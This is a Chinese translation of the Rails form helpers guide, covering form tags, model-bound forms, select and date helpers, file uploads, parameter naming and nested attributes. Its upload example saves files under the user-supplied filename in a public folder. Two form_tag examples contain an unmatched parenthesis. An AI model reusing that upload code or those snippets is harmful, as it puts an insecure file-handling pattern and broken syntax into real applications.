
Rails 使用特定的规则生成 input 的 name 属性值，便于提交非标量值，例如数组和 Hash，这些值也可通过 params 获取。

各帮助方法的详细用法请查阅 API 文档。

####  1.3.1 复选框

复选框是一种表单控件，给用户一些选项，可用于启用或禁用某项功能。
<%= check_box_tag(:pet_dog) %>
<%= label_tag(:pet_dog, "I own a dog") %>
<%= check_box_tag(:pet_cat) %>
<%= label_tag(:pet_cat, "I own a cat") %>

生成的 HTML 如下：
<input id="pet_dog" name="pet_dog" type="checkbox" value="1" />
<label for="pet_dog">I own a dog</label>
<input id="pet_cat" name="pet_cat" type="checkbox" value="1" />
<label for="pet_cat">I own a cat</label>

check_box_tag 方法的第一个参数是 name 属性的值。第二个参数是 value 属性的值。选中复选框后，value 属性的值会包含在提交的表单数据中，因此可以通过 params 获取。
####  1.3.2 单选框

单选框有点类似复选框，但是各单选框之间是互斥的，只能选择一组中的一个：
<%= radio_button_tag(:age, "child") %>
<%= label_tag(:age_child, "I am younger than 21") %>
<%= radio_button_tag(:age, "adult") %>
<%= label_tag(:age_adult, "I'm over 21") %>

生成的 HTML 如下：
<input id="age_child" name="age" type="radio" value="child" />
<label for="age_child">I am younger than 21</label>
<input id="age_adult" name="age" type="radio" value="adult" />
<label for="age_adult">I'm over 21</label>

和 check_box_tag 方法一样，radio_button_tag 方法的第二个参数也是 value 属性的值。因为两个单选框的 name 属性值一样（都是 age），所以用户只能选择其中一个单选框，params[:age] 的值不是 "child" 就是 "adult"。

复选框和单选框一定要指定 label 标签。label 标签可以为指定的选项框附加文字说明，还能增加选项框的点选范围，让用户更容易选中。

###  1.4 其他帮助方法

其他值得说明的表单控件包括：多行文本输入框，密码输入框，隐藏输入框，搜索关键字输入框，电话号码输入框，日期输入框，时间输入框，颜色输入框，日期时间输入框，本地日期时间输入框，月份输入框，星期输入框，URL 地址输入框，Email 地址输入框，数字输入框和范围输入框：
<%= text_area_tag(:message, "Hi, nice site", size: "24x6") %>
<%= password_field_tag(:password) %>
<%= hidden_field_tag(:parent_id, "5") %>
<%= search_field(:user, :name) %>
<%= telephone_field(:user, :phone) %>
<%= date_field(:user, :born_on) %>
<%= datetime_field(:user, :meeting_time) %>
<%= datetime_local_field(:user, :graduation_day) %>
<%= month_field(:user, :birthday_month) %>
<%= week_field(:user, :birthday_week) %>
<%= url_field(:user, :homepage) %>
<%= email_field(:user, :address) %>
<%= color_field(:user, :favorite_color) %>
<%= time_field(:task, :started_at) %>
<%= number_field(:product, :price, in: 1.0..20.0, step: 0.5) %>
<%= range_field(:product, :discount, in: 1..100) %>

生成的 HTML 如下：
<textarea id="message" name="message" cols="24" rows="6">Hi, nice site</textarea>
<input id="password" name="password" type="password" />
<input id="parent_id" name="parent_id" type="hidden" value="5" />
<input id="user_name" name="user[name]" type="search" />
<input id="user_phone" name="user[phone]" type="tel" />
<input id="user_born_on" name="user[born_on]" type="date" />
<input id="user_meeting_time" name="user[meeting_time]" type="datetime" />
<input id="user_graduation_day" name="user[graduation_day]" type="datetime-local" />
<input id="user_birthday_month" name="user[birthday_month]" type="month" />
<input id="user_birthday_week" name="user[birthday_week]" type="week" />
<input id="user_homepage" name="user[homepage]" type="url" />
<input id="user_address" name="user[address]" type="email" />
<input id="user_favorite_color" name="user[favorite_color]" type="color" value="#000000" />
<input id="task_started_at" name="task[started_at]" type="time" />
<input id="product_price" max="20.0" min="1.0" name="product[price]" step="0.5" type="number" />
<input id="product_discount" max="100" min="1" name="product[discount]" type="range" />

用户看不到隐藏输入框，但却和其他文本类输入框一样，能保存数据。隐藏输入框中的值可以通过 JavaScript 修改。

搜索关键字输入框，电话号码输入框，日期输入框，时间输入框，颜色输入框，日期时间输入框，本地日期时间输入框，月份输入框，星期输入框，URL 地址输入框，Email 地址输入框，数字输入框和范围输入框是 HTML5 提供的控件。如果想在旧版本的浏览器中保持体验一致，需要使用 HTML5 polyfill（使用 CSS 或 JavaScript 编写）。polyfill 虽无不足之处，但现今比较流行的工具是 Modernizr 和 yepnope，根据检测到的 HTML5 特性添加相应的功能。

如果使用密码输入框，或许还不想把其中的值写入日志。具体做法参见“Rails 安全指南”。

##  2 处理模型对象
###  2.1 模型对象帮助方法

表单的一个特别常见的用途是编辑或创建模型对象。这时可以使用 *_tag 帮助方法，但是太麻烦了，每个元素都要设置正确的参数名称和默认值。Rails 提供了很多帮助方法可以简化这一过程，这些帮助方法没有 _tag 后缀，例如 text_field 和 text_area。

这些帮助方法的第一个参数是实例变量的名字，第二个参数是在对象上调用的方法名（一般都是模型的属性）。Rails 会把在对象上调用方法得到的值设为控件的 value 属性值，并且设置相应的 name 属性值。如果在控制器中定义了 @person 实例变量，其名字为“Henry”，在表单中有以下代码：
<%= text_field(:person, :name) %>

生成的结果如下：
<input id="person_name" name="person[name]" type="text" value="Henry"/>

提交表单后，用户输入的值存储在 params[:person][:name] 中。params[:person] 这个 Hash 可以传递给 Person.new 方法；如果 @person 是 Person 的实例，还可传递给 @person.update。一般来说，这些帮助方法的第二个参数是对象属性的名字，但 Rails 并不对此做强制要求，只要对象能响应 name 和 name= 方法即可。

传入的参数必须是实例变量的名字，例如 :person 或 "person"，而不是模型对象的实例本身。

Rails 还提供了用于显示模型对象数据验证错误的帮助方法，详情参阅“Active Record 数据验证”一文。

###  2.2 把表单绑定到对象上

虽然上述用法很方便，但却不是最好的使用方式。如果 Person 有很多要编辑的属性，我们就得不断重复编写要编辑对象的名字。我们想要的是能把表单绑定到对象上的方法，form_for 帮助方法就是为此而生。

假设有个用来处理文章的控制器 app/controllers/articles_controller.rb：
def new
  @article = Article.new
end

在 new 动作对应的视图 app/views/articles/new.html.erb 中可以像下面这样使用 form_for 方法：
<%= form_for @article, url: {action: "create"}, html: {class: "nifty_form"} do |f| %>
  <%= f.text_field :title %>
  <%= f.text_area :body, size: "60x12" %>
  <%= f.submit "Create" %>
<% end %>

有几点要注意：

    @article 是要编辑的对象；
    form_for 方法的参数中只有一个 Hash。路由选项传入嵌套 Hash :url 中，HTML 选项传入嵌套 Hash :html 中。还可指定 :namespace 选项为 form 元素生成一个唯一的 ID 属性值。:namespace 选项的值会作为自动生成的 ID 的前缀。
    form_for 方法会拽入一个表单构造器对象（f 变量）；
    生成表单控件的帮助方法在表单构造器对象 f 上调用；

上述代码生成的 HTML 如下：
<form accept-charset="UTF-8" action="/articles/create" method="post" class="nifty_form">
  <input id="article_title" name="article[title]" type="text" />
  <textarea id="article_body" name="article[body]" cols="60" rows="12"></textarea>
  <input name="commit" type="submit" value="Create" />
</form>

form_for 方法的第一个参数指明通过 params 的哪个键获取表单中的数据。在上面的例子中，第一个参数名为 article，因此所有控件的 name 属性都是 article[attribute_name] 这种形式。所以，在 create 动作中，params[:article] 这个 Hash 有两个键：:title 和 :body。name 属性的重要性参阅“理解参数命名约定”一节。

在表单构造器对象上调用帮助方法和在模型对象上调用的效果一样，唯有一点区别，无法指定编辑哪个模型对象，因为这由表单构造器负责。

使用 fields_for 帮助方法也可创建类似的绑定，但不会生成 <form> 标签。在同一表单中编辑多个模型对象时经常使用 fields_for 方法。例如，有个 Person 模型，和 ContactDetail 模型关联，编写如下的表单可以同时创建两个模型的对象：
<%= form_for @person, url: {action: "create"} do |person_form| %>
  <%= person_form.text_field :name %>
  <%= fields_for @person.contact_detail do |contact_details_form| %>
    <%= contact_details_form.text_field :phone_number %>
  <% end %>
<% end %>

生成的 HTML 如下：
<form accept-charset="UTF-8" action="/people/create" class="new_person" id="new_person" method="post">
  <input id="person_name" name="person[name]" type="text" />
  <input id="contact_detail_phone_number" name="contact_detail[phone_number]" type="text" />
</form>

fields_for 方法拽入的对象和 form_for 方法一样，都是表单构造器（其实在代码内部 form_for 会调用 fields_for 方法）。

###  2.3 记录辨别技术

用户可以直接处理程序中的 Article 模型，根据开发 Rails 的最佳实践，应该将其视为一个资源：
resources :articles

声明资源有很多附属作用。资源的创建与使用请阅读“Rails 路由全解”一文。

处理 REST 资源时，使用“记录辨别”技术可以简化 form_for 方法的调用。简单来说，你可以只把模型实例传给 form_for，让 Rails 查找模型名等其他信息：
## Creating a new article
# long-style:
form_for(@article, url: articles_path)
# same thing, short-style (record identification gets used):
form_for(@article)
 
## Editing an existing article
# long-style:
form_for(@article, url: article_path(@article), html: {method: "patch"})
# short-style:
form_for(@article)

注意，不管记录是否存在，使用简短形式的 form_for 调用都很方便。记录辨别技术很智能，会调用 record.new_record? 方法检查是否为新记录；而且还能自动选择正确的提交地址，根据对象所属的类生成 name 属性的值。

Rails 还会自动设置 class 和 id 属性。在新建文章的表单中，id 和 class 属性的值都是 new_article。如果编辑 ID 为 23 的文章，表单的 class 为 edit_article，id 为 edit_article_23。为了行文简洁，后文会省略这些属性。

如果在模型中使用单表继承（single-table inheritance，简称 STI），且只有父类声明为资源，子类就不能依赖记录辨别技术，必须指定模型名，:url 和 :method 选项。

####  2.3.1 处理命名空间

如果在路由中使用了命名空间，form_for 方法也有相应的简写形式。如果程序中有个 admin 命名空间，表单可以写成：
form_for [:admin, @article]

这个表单会提交到命名空间 admin 中的 ArticlesController（更新文章时提交到 admin_article_path(@article)）。如果命名空间有很多层，句法类似：
form_for [:admin, :management, @article]

关于 Rails 路由的详细信息以及相关的约定，请阅读“Rails 路由全解”一文。

###  2.4 表单如何处理 PATCH，PUT 或 DELETE 请求？

Rails 框架建议使用 REST 架构设计程序，因此除了 GET 和 POST 请求之外，还要处理 PATCH 和 DELETE 请求。但是大多数浏览器不支持从表单中提交 GET 和 POST 之外的请求。

为了解决这个问题，Rails 使用 POST 请求进行模拟，并在表单中加入一个名为 _method 的隐藏字段，其值表示真正希望使用的请求方法：
form_tag(search_path, method: "patch")

生成的 HTML 为：
<form accept-charset="UTF-8" action="/search" method="post">
  <div style="margin:0;padding:0">
    <input name="_method" type="hidden" value="patch" />
    <input name="utf8" type="hidden" value="&#x2713;" />
    <input name="authenticity_token" type="hidden" value="f755bb0ed134b76c432144748a6d4b7a7ddf2b71" />
  </div>
  ...

处理提交的数据时，Rails 以 _method 的值为准，发起相应类型的请求（在这个例子中是 PATCH 请求）。


##  3 快速创建选择列表

HTML 中的选择列表往往需要编写很多标记语言（每个选项都要创建一个 option 元素），因此最适合自动生成。

选择列表的标记语言如下所示：
<select name="city_id" id="city_id">
  <option value="1">Lisbon</option>
  <option value="2">Madrid</option>
  ...
  <option value="12">Berlin</option>
</select>

这个列表列出了一组城市名。在程序内部只需要处理各选项的 ID，因此把各选项的 value 属性设为 ID。下面来看一下 Rails 为我们提供了哪些帮助方法。
###  3.1 select 和 option 标签

最常见的帮助方法是 select_tag，如其名所示，其作用是生成 select 标签，其中可以包含一个由选项组成的字符串：
<%= select_tag(:city_id, '<option value="1">Lisbon</option>...') %>

这只是个开始，还无法动态生成 option 标签。option 标签可以使用帮助方法 options_for_select 生成：
<%= options_for_select([['Lisbon', 1], ['Madrid', 2], ...]) %>

生成的 HTML 为：
<option value="1">Lisbon</option>
<option value="2">Madrid</option>
...

options_for_select 方法的第一个参数是一个嵌套数组，每个元素都有两个子元素：选项的文本（城市名）和选项的 value 属性值（城市 ID）。选项的 value 属性值会提交到控制器中。ID 的值经常表示数据库对象，但这个例子除外。

知道上述用法后，就可以结合 select_tag 和 options_for_select 两个方法生成所需的完整 HTML 标记：
<%= select_tag(:city_id, options_for_select(...)) %>

options_for_select 方法还可预先选中一个选项，通过第二个参数指定：
<%= options_for_select([['Lisbon', 1], ['Madrid', 2], ...], 2) %>

生成的 HTML 如下：
<option value="1">Lisbon</option>
<option value="2" selected="selected">Madrid</option>
...

当 Rails 发现生成的选项 value 属性值和指定的值一样时，就会在这个选项中加上 selected 属性。

options_for_select 方法的第二个参数必须完全和需要选中的选项 value 属性值相等。如果 value 的值是整数 2，就不能传入字符串 "2"，必须传入数字 2。注意，从 params 中获取的值都是字符串。

使用 Hash 可以为选项指定任意属性：
<%= options_for_select([['Lisbon', 1, {'data-size' => '2.8 million'}], ['Madrid', 2, {'data-size' => '3.2 million'}]], 2) %>

生成的 HTML 如下：
<option value="1" data-size="2.8 million">Lisbon</option>
<option value="2" selected="selected" data-size="3.2 million">Madrid</option>
...

###  3.2 处理模型的选择列表

大多数情况下，表单的控件用于处理指定的数据库模型，正如你所期望的，Rails 为此提供了很多用于生成选择列表的帮助方法。和其他表单帮助方法一样，处理模型时要去掉 select_tag 中的 _tag：
# controller:
@person = Person.new(city_id: 2)
# view:
<%= select(:person, :city_id, [['Lisbon', 1], ['Madrid', 2], ...]) %>

注意，第三个参数，选项数组，和传入 options_for_select 方法的参数一样。这种帮助方法的一个好处是，无需关心如何预先选中正确的城市，只要用户设置了所在城市，Rails 就会读取 @person.city_id 的值，为你代劳。

和其他帮助方法一样，如果要在绑定到 @person 对象上的表单构造器上使用 select 方法，相应的句法为：
# select on a form builder
<%= f.select(:city_id, ...) %>

select 帮助方法还可接受一个代码块：
<%= f.select(:city_id) do %>
  <% [['Lisbon', 1], ['Madrid', 2]].each do |c| -%>
    <%= content_tag(:option, c.first, value: c.last) %>
  <% end %>
<% end %>

如果使用 select 方法（或类似的帮助方法，例如 collection_select 和 select_tag）处理 belongs_to 关联，必须传入外键名（在上例中是 city_id），而不是关联名。如果传入的是 city 而不是 city_id，把 params 传给 Person.new 或 update 方法时，会抛出异常：ActiveRecord::AssociationTypeMismatch: City(#17815740) expected, got String(#1138750)。这个要求还可以这么理解，表单帮助方法只能编辑模型的属性。此外还要知道，允许用户直接编辑外键具有潜在地安全隐患。
###  3.3 根据任意对象组成的集合创建 option 标签

使用 options_for_select 方法生成 option 标签必须使用数组指定各选项的文本和值。如果有个 City 模型，想根据模型实例组成的集合生成 option 标签应该怎么做呢？一种方法是遍历集合，创建一个嵌套数组：
<% cities_array = City.all.map { |city| [city.name, city.id] } %>
<%= options_for_select(cities_array) %>

这种方法完全可行，但 Rails 提供了一个更简洁的帮助方法：options_from_collection_for_select。这个方法接受一个由任意对象组成的集合，以及另外两个参数：获取选项文本和值使用的方法。
<%= options_from_collection_for_select(City.all, :id, :name) %>

从这个帮助方法的名字中可以看出，它只生成 option 标签。如果想生成可使用的选择列表，和 options_for_select 方法一样要结合 select_tag 方法一起使用。select 方法集成了 select_tag 和 options_for_select 两个方法，类似地，处理集合时，可以使用 collection_select 方法，它集成了 select_tag 和 options_from_collection_for_select 两个方法。
<%= collection_select(:person, :city_id, City.all, :id, :name) %>

options_from_collection_for_select 对 collection_select 来说，就像 options_for_select 与 select 的关系一样。

传入 options_for_select 方法的子数组第一个元素是选项文本，第二个元素是选项的值，但传入 options_from_collection_for_select 方法的第一个参数是获取选项值的方法，第二个才是获取选项文本的方法。
###  3.4 时区和国家选择列表

要想在 Rails 程序中实现时区相关的功能，就得询问用户其所在的时区。设定时区时可以使用 collection_select 方法根据预先定义的时区对象生成一个选择列表，也可以直接使用 time_zone_select 帮助方法：
<%= time_zone_select(:person, :time_zone) %>

如果想定制时区列表，可使用 time_zone_options_for_select 帮助方法。这两个方法可接受的参数请查阅 API 文档。

以前 Rails 还内置了 country_select 帮助方法，用于创建国家选择列表，但现在已经被提取出来做成了 country_select gem。使用这个 gem 时要注意，是否包含某个国家还存在争议（正因为此，Rails 才不想内置）。

##  4 使用日期和时间表单帮助方法

你可以选择不使用生成 HTML5 日期和时间输入框的帮助方法，而使用生成日期和时间选择列表的帮助方法。生成日期和时间选择列表的帮助方法和其他表单帮助方法有两个重要的不同点：

    日期和时间不在单个 input 元素中输入，而是每个时间单位都有各自的元素，因此在 params 中就没有单个值能表示完整的日期和时间；
    其他帮助方法通过 _tag 后缀区分是独立的帮助方法还是操作模型对象的帮助方法。对日期和时间帮助方法来说，select_date、select_time 和 select_datetime 是独立的帮助方法，date_select、time_select 和 datetime_select 是相应的操作模型对象的帮助方法。

这两类帮助方法都会为每个时间单位（年，月，日等）生成各自的选择列表。
###  4.1 独立的帮助方法

`select_*` 这类帮助方法的第一个参数是 Date、Time 或 DateTime 类的实例，并选中指定的日期时间。如果不指定，就使用当前日期时间。例如：
<%= select_date Date.today, prefix: :start_date %>

生成的 HTML 如下（为了行为简便，省略了各选项）：
<select id="start_date_year" name="start_date[year]"> ... </select>
<select id="start_date_month" name="start_date[month]"> ... </select>
<select id="start_date_day" name="start_date[day]"> ... </select>

上面各控件会组成 params[:start_date]，其中包含名为 :year、:month 和 :day 的键。如果想获取 Time 或 Date 对象，要读取各时间单位的值，然后传入适当的构造方法中，例如：
Date.civil(params[:start_date][:year].to_i, params[:start_date][:month].to_i, params[:start_date][:day].to_i)

:prefix 选项的作用是指定从 params 中获取各时间组成部分的键名。在上例中，:prefix 选项的值是 start_date。如果不指定这个选项，就是用默认值 date。
###  4.2 处理模型对象的帮助方法

select_date 方法在更新或创建 Active Record 对象的表单中有点力不从心，因为 Active Record 期望 params 中的每个元素都对应一个属性。用于处理模型对象的日期和时间帮助方法会提交一个名字特殊的参数，Active Record 看到这个参数时就知道必须和其他参数结合起来传递给字段类型对应的构造方法。例如：
<%= date_select :person, :birth_date %>

生成的 HTML 如下（为了行为简介，省略了各选项）：
<select id="person_birth_date_1i" name="person[birth_date(1i)]"> ... </select>
<select id="person_birth_date_2i" name="person[birth_date(2i)]"> ... </select>
<select id="person_birth_date_3i" name="person[birth_date(3i)]"> ... </select>

创建的 params Hash 如下：
{'person' => {'birth_date(1i)' => '2008', 'birth_date(2i)' => '11', 'birth_date(3i)' => '22'}}

传递给 Person.new（或 update）方法时，Active Record 知道这些参数应该结合在一起组成 birth_date 属性，使用括号中的信息决定传给 Date.civil 等方法的顺序。
###  4.3 通用选项

这两种帮助方法都使用同一组核心函数生成各选择列表，因此使用的选项基本一样。默认情况下，Rails 生成的年份列表包含本年前后五年。如果这个范围不能满足需求，可以使用 :start_year 和 :end_year 选项指定。更详细的可用选项列表请参阅 API 文档。

基本原则是，使用 date_select 方法处理模型对象，其他情况都使用 select_date 方法，例如在搜索表单中根据日期过滤搜索结果。

很多时候内置的日期选择列表不太智能，不能协助用户处理日期和星期几之间的对应关系。
###  4.4 单个时间单位选择列表

有时只需显示日期中的一部分，例如年份或月份。为此，Rails 提供了一系列帮助方法，分别用于创建各时间单位的选择列表：select_year，select_month，select_day，select_hour，select_minute，select_second。各帮助方法的作用一目了然。默认情况下，这些帮助方法创建的选择列表 name 属性都跟时间单位的名称一样，例如，select_year 方法创建的 select 元素 name 属性值为 year，select_month 方法创建的 select 元素 name 属性值为 month，不过也可使用 :field_name 选项指定其他值。:prefix 选项的作用与在 select_date 和 select_time 方法中一样，且默认值也一样。

这些帮助方法的第一个参数指定选中哪个值，可以是 Date、Time 或 DateTime 类的实例（会从实例中获取对应的值），也可以是数字。例如：
<%= select_year(2009) %>
<%= select_year(Time.now) %>

如果今年是 2009 年，那么上述两种用法生成的 HTML 是一样的。用户选择的值可以通过 params[:date][:year] 获取。


##  5 上传文件

程序中一个常见的任务是上传某种文件，可以是用户的照片，或者 CSV 文件包含要处理的数据。处理文件上传功能时有一点要特别注意，表单的编码必须设为 "multipart/form-data"。如果使用 form_for 生成上传文件的表单，Rails 会自动加入这个编码。如果使用 form_tag 就得自己设置，如下例所示。

下面这两个表单都能用于上传文件：
<%= form_tag({action: :upload}, multipart: true) do %>
  <%= file_field_tag 'picture' %>
<% end %>
 
<%= form_for @person do |f| %>
  <%= f.file_field :picture %>
<% end %>

像往常一样，Rails 提供了两种帮助方法：独立的 file_field_tag 方法和处理模型的 file_field 方法。这两个方法和其他帮助方法唯一的区别是不能为文件选择框指定默认值，因为这样做没有意义。正如你所期望的，file_field_tag 方法上传的文件在 params[:picture] 中，file_field 方法上传的文件在 params[:person][:picture] 中。
##  5.1 上传了什么

存在 params Hash 中的对象其实是 IO 的子类，根据文件大小，可能是 StringIO 或者是存储在临时文件中的 File 实例。不管是哪个类，这个对象都有 original_filename 属性，其值为文件在用户电脑中的文件名；还有个 content_type 属性，其值为上传文件的 MIME 类型。下面这段代码把上传的文件保存在 #{Rails.root}/public/uploads 文件夹中，文件名和原始文件名一样（假设使用前面的表单上传）。
def upload
  uploaded_io = params[:person][:picture]
  File.open(Rails.root.join('public', 'uploads', uploaded_io.original_filename), 'wb') do |file|
    file.write(uploaded_io.read)
  end
end

文件上传完毕后可以做很多操作，例如把文件存储在某个地方（服务器的硬盘，Amazon S3 等）；把文件和模型关联起来；缩放图片，生成缩略图。这些复杂的操作已经超出了本文范畴。有很多代码库可以协助完成这些操作，其中两个广为人知的是 CarrierWave 和 Paperclip。

如果用户没有选择文件，相应的参数为空字符串。
###  5.2 使用 Ajax 上传文件

异步上传文件和其他类型的表单不一样，仅在 form_for 方法中加入 remote: true 选项是不够的。在 Ajax 表单中，使用浏览器中的 JavaScript 进行序列化，但是 JavaScript 无法读取硬盘中的文件，因此文件无法上传。常见的解决方法是使用一个隐藏的 iframe 作为表单提交的目标。

##  6 定制表单构造器

前面说过，form_for 和 fields_for 方法拽入的对象是 FormBuilder 或其子类的实例。表单构造器中封装了用于显示单个对象表单元素的信息。你可以使用常规的方式使用各帮助方法，也可以继承 FormBuilder 类，添加其他的帮助方法。例如：
<%= form_for @person do |f| %>
  <%= text_field_with_label f, :first_name %>
<% end %>

可以写成：
<%= form_for @person, builder: LabellingFormBuilder do |f| %>
  <%= f.text_field :first_name %>
<% end %>

在此之前需要定义 LabellingFormBuilder 类，如下所示：
class LabellingFormBuilder < ActionView::Helpers::FormBuilder
  def text_field(attribute, options={})
    label(attribute) + super
  end
end

如果经常这么使用，可以定义 labeled_form_for 帮助方法，自动启用 builder: LabellingFormBuilder 选项。

所用的表单构造器还会决定执行下面这个渲染操作时会发生什么：
<%= render partial: f %>

如果 f 是 FormBuilder 类的实例，上述代码会渲染局部视图 form，并把传入局部视图的对象设为表单构造器。如果表单构造器是 LabellingFormBuilder 类的实例，则会渲染局部视图 labelling_form。

##  7 理解参数命名约定

从前几节可以看出，表单提交的数据可以直接保存在 params Hash 中，或者嵌套在子 Hash 中。例如，在 Person 模型对应控制器的 create 动作中，params[:person] 一般是一个 Hash，保存创建 Person 实例的所有属性。params Hash 中也可以保存数组，或由 Hash 组成的数组，等等。

HTML 表单基本上不能处理任何结构化数据，提交的只是由普通的字符串组成的键值对。在程序中使用的数组参数和 Hash 参数是通过 Rails 的参数命名约定生成的。

如果想快速试验本节中的示例，可以在控制台中直接调用 Rack 的参数解析器。例如： T> ruby TIP: Rack::Utils.parse_query "name=fred&phone=0123456789" TIP: # => {"name"=>"fred", "phone"=>"0123456789"} TIP:

###  7.1 基本结构

数组和 Hash 是两种基本结构。获取 Hash 中值的方法和 params 一样。如果表单中包含以下控件：
<input id="person_name" name="person[name]" type="text" value="Henry"/>

得到的 params 值为：
{'person' => {'name' => 'Henry'}}

在控制器中可以使用 params[:person][:name] 获取提交的值。

Hash 可以随意嵌套，不限制层级，例如：
<input id="person_address_city" name="person[address][city]" type="text" value="New York"/>

得到的 params 值为：
{'person' => {'address' => {'city' => 'New York'}}}

一般情况下 Rails 会忽略重复的参数名。如果参数名中包含空的方括号（[]），Rails 会将其组建成一个数组。如果想让用户输入多个电话号码，在表单中可以这么做：
<input name="person[phone_number][]" type="text"/>
<input name="person[phone_number][]" type="text"/>
<input name="person[phone_number][]" type="text"/>

得到的 params[:person][:phone_number] 就是一个数组。

###  7.2 结合在一起使用

上述命名约定可以结合起来使用，让 params 的某个元素值为数组（如前例），或者由 Hash 组成的数组。例如，使用下面的表单控件可以填写多个地址：
<input name="addresses[][line1]" type="text"/>
<input name="addresses[][line2]" type="text"/>
<input name="addresses[][city]" type="text"/>

得到的 params[:addresses] 值是一个由 Hash 组成的数组，Hash 中的键包括 line1、line2 和 city。如果 Rails 发现输入框的 name 属性值已经存在于当前 Hash 中，就会新建一个 Hash。

不过有个限制，虽然 Hash 可以嵌套任意层级，但数组只能嵌套一层。如果需要嵌套多层数组，可以使用 Hash 实现。例如，如果想创建一个包含模型对象的数组，可以创建一个 Hash，以模型对象的 ID、数组索引或其他参数为键。

数组类型参数不能很好的在 check_box 帮助方法中使用。根据 HTML 规范，未选中的复选框不应该提交值。但是不管是否选中都提交值往往更便于处理。为此 check_box 方法额外创建了一个同名的隐藏 input 元素。如果没有选中复选框，只会提交隐藏 input 元素的值，如果选中则同时提交两个值，但复选框的值优先级更高。处理数组参数时重复提交相同的参数会让 Rails 迷惑，因为对 Rails 来说，见到重复的 input 值，就会创建一个新数组元素。所以更推荐使用 check_box_tag 方法，或者用 Hash 代替数组。

###  7.3 使用表单帮助方法

前面几节并没有使用 Rails 提供的表单帮助方法。你可以自己创建 input 元素的 name 属性，然后直接将其传递给 text_field_tag 等帮助方法。但是 Rails 提供了更高级的支持。本节介绍 form_for 和 fields_for 方法的 name 参数以及 :index 选项。

你可能会想编写一个表单，其中有很多字段，用于编辑某人的所有地址。例如：
<%= form_for @person do |person_form| %>
  <%= person_form.text_field :name %>
  <% @person.addresses.each do |address| %>
    <%= person_form.fields_for address, index: address.id do |address_form|%>
      <%= address_form.text_field :city %>
    <% end %>
  <% end %>
<% end %>

假设这个人有两个地址，ID 分别为 23 和 45。那么上述代码生成的 HTML 如下：
<form accept-charset="UTF-8" action="/people/1" class="edit_person" id="edit_person_1" method="post">
  <input id="person_name" name="person[name]" type="text" />
  <input id="person_address_23_city" name="person[address][23][city]" type="text" />
  <input id="person_address_45_city" name="person[address][45][city]" type="text" />
</form>

得到的 params Hash 如下：
{'person' => {'name' => 'Bob', 'address' => {'23' => {'city' => 'Paris'}, '45' => {'city' => 'London'}}}}

Rails 之所以知道这些输入框中的值是 person Hash 的一部分，是因为我们在第一个表单构造器上调用了 fields_for 方法。指定 :index 选项的目的是告诉 Rails，其中的输入框 name 属性值不是 person[address][city]，而要在 address 和 city 索引之间插入 :index 选项对应的值（放入方括号中）。这么做很有用，因为便于分辨要修改的 Address 记录是哪个。:index 选项的值可以是具有其他意义的数字、字符串，甚至是 nil（此时会新建一个数组参数）。

如果想创建更复杂的嵌套，可以指定 name 属性的第一部分（前例中的 person[address]）：
<%= fields_for 'person[address][primary]', address, index: address do |address_form| %>
  <%= address_form.text_field :city %>
<% end %>

生成的 HTML 如下：
<input id="person_address_primary_1_city" name="person[address][primary][1][city]" type="text" value="bologna" />

一般来说，最终得到的 name 属性值是 fields_for 或 form_for 方法的第一个参数加 :index 选项的值再加属性名。:index 选项也可直接传给 text_field 等帮助方法，但在表单构造器中指定可以避免代码重复。

为了简化句法，还可以不使用 :index 选项，直接在第一个参数后面加上 []。这么做和指定 index: address 选项的作用一样，因此下面这段代码
<%= fields_for 'person[address][primary][]', address do |address_form| %>
  <%= address_form.text_field :city %>
<% end %>

生成的 HTML 和前面一样。


##  8 处理外部资源的表单

如果想把数据提交到外部资源，还是可以使用 Rails 提供的表单帮助方法。但有时需要为这些资源创建 authenticity_token。做法是把 authenticity_token: 'your_external_token' 作为选项传递给 form_tag 方法：
<%= form_tag 'http://farfar.away/form', authenticity_token: 'external_token') do %>
  Form contents
<% end %>

提交到外部资源的表单，其中可包含的字段有时受 API 的限制，例如支付网关。所有可能不用生成隐藏的 authenticity_token 字段，此时把 :authenticity_token 选项设为 false 即可：
<%= form_tag 'http://farfar.away/form', authenticity_token: false) do %>
  Form contents
<% end %>

以上技术也可用在 form_for 方法中：
<%= form_for @invoice, url: external_url, authenticity_token: 'external_token' do |f| %>
  Form contents
<% end %>

如果不想生成 authenticity_token 字段，可以这么做：
<%= form_for @invoice, url: external_url, authenticity_token: false do |f| %>
  Form contents
<% end %>

##  9 编写复杂的表单

很多程序已经复杂到在一个表单中编辑一个对象已经无法满足需求了。例如，创建 Person 对象时还想让用户在同一个表单中创建多个地址（家庭地址，工作地址，等等）。以后编辑这个 Person 时，还想让用户根据需要添加、删除或修改地址。

###  9.1 设置模型

Active Record 为此种需求在模型中提供了支持，通过 accepts_nested_attributes_for 方法实现：
class Person < ActiveRecord::Base
  has_many :addresses
  accepts_nested_attributes_for :addresses
end
 
class Address < ActiveRecord::Base
  belongs_to :person
end

这段代码会在 Person 对象上创建 addresses_attributes= 方法，用于创建、更新和删除地址（可选操作）。
###  9.2 嵌套表单

使用下面的表单可以创建 Person 对象及其地址：
<%= form_for @person do |f| %>
  Addresses:
  <ul>
    <%= f.fields_for :addresses do |addresses_form| %>
      <li>
        <%= addresses_form.label :kind %>
        <%= addresses_form.text_field :kind %>
 
        <%= addresses_form.label :street %>
        <%= addresses_form.text_field :street %>
        ...
      </li>
    <% end %>
  </ul>
<% end %>

如果关联支持嵌套属性，fields_for 方法会为关联中的每个元素执行一遍代码块。如果没有地址，就不执行代码块。一般的作法是在控制器中构建一个或多个空的子属性，这样至少会有一组字段显示出来。下面的例子会在新建 Person 对象的表单中显示两组地址字段。
def new
  @person = Person.new
  2.times { @person.addresses.build}
end

fields_for 方法拽入一个表单构造器，参数的名字就是 accepts_nested_attributes_for 方法期望的。例如，如果用户填写了两个地址，提交的参数如下：
{
  'person' => {
    'name' => 'John Doe',
    'addresses_attributes' => {
      '0' => {
        'kind' => 'Home',
        'street' => '221b Baker Street'
      },
      '1' => {
        'kind' => 'Office',
        'street' => '31 Spooner Street'
      }
    }
  }
}

:addresses_attributes Hash 的键是什么不重要，但至少不能相同。

如果关联的对象已经存在于数据库中，fields_for 方法会自动生成一个隐藏字段，value 属性的值为记录的 id。把 include_id: false 选项传递给 fields_for 方法可以禁止生成这个隐藏字段。如果自动生成的字段位置不对，导致 HTML 无法通过验证，或者在 ORM 关系中子对象不存在 id 字段，就可以禁止自动生成这个隐藏字段。

###  9.3 控制器端

像往常一样，参数传递给模型之前，在控制器中要过滤参数：
def create
  @person = Person.new(person_params)
  # ...
end
 
private
  def person_params
    params.require(:person).permit(:name, addresses_attributes: [:id, :kind, :street])
  end

###  9.4 删除对象

